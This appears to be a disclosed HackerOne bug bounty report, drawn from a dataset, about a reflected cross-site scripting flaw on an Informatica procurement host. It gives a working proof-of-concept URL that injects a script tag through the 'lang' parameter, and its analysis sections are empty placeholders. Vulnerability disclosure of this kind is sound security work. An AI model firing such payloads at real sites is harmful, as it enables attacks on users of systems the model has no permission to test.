---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '831803'
original_report_id: '831803'
title: RXSS in http://procurement-businesscatalog.informatica.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: informatica
created_at: '2020-03-26T04:38:10.132Z'
disclosed_at: '2020-03-27T10:04:59.549Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# RXSS in http://procurement-businesscatalog.informatica.com

## Metadata

- HackerOne Report ID: 831803
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: informatica
- Disclosed At: 2020-03-27T10:04:59.549Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi, this is a simple XSS in the host below:

Reproduction Steps
Visit the following URL: `http://procurement-businesscatalog.informatica.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E`

{F760997}

## Impact

Standard XSS impact.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
